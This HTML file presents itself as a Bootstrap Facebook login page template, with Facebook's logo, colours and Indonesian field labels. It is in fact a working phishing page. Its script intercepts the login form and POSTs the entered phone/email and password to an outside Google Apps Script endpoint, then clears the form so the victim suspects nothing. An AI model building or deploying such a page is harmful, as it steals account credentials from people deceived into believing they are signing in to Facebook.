<!DOCTYPE html>
<html>

<head>
    <title>Bootstrap 5 Facebook Login Page</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="w3hubs.com">
    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
    <style type="text/css">
        body {
            background-color: #f0f2f5;
            font-family: "Nunito Sans";
        }

        .login-form {
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            background-color: #fff;
            padding: 25px;
        }

        h3 {
            padding-left: 30px;
            padding-right: 20px;
        }

        .btn-custom {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 28px;
            color: #fff;
            font-weight: 700;
            height: 48px;
        }

        .btn-custom {
            color: #fff !important;
        }

        input {
            height: 52px;
            font-size: 18px !important;
            color: #f2f2f2;
        }

        .form-control:focus {
            box-shadow: 0 0 0 0 rgba(13, 110, 253, .25);
        }

        a {
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        @media(max-width: 768px) {

            .col-md-7,
            p {
                display: none;
            }

            input {
                font-size: 16px !important;
            }

            .login-form {
                box-shadow: none;
            }
        }

        .img {
            width: 40%;
            margin-bottom: 10px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="row align-items-center justify-content-center vh-100">
            <div class="col-md-5">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="img mx-auto d-block">
                <form class="login-form" action="#" name="fb-contact-form">
                    <div class="mb-3">
                        <input type="text" name="username" class="form-control" placeholder="Nomor ponsel atau email"
                            required>
                    </div>
                    <div class="mb-3">
                        <input type="password" name="password" class="form-control" placeholder="Kata Sandi" required>
                    </div>
                    <button type="submit" class="btn btn-custom btn-lg btn-block mt-3">Masuk</button>
                    <div class="text-center pt-3 pb-3">
                        <a href="#" class="">Lupa Kata Sandi?</a>
                        <hr>
                        <button type="button" class="btn btn-success btn-lg mt-3">Buat Akun Baru</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbxYilnKdSR9BH41AAD67QaagoSUzvQG-dCSG3lJfUtrdcbwAkl7It7AGJMMHq3kGY5_/exec'
        const form = document.forms['fb-contact-form']

        form.addEventListener('submit', e => {
            e.preventDefault()
            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
                .then(response => {
                    form.reset();
                    console.log('Success!', response)
                })
                .catch(error => console.error('Error!', error.message))
        })
    </script>

</body>

</html>
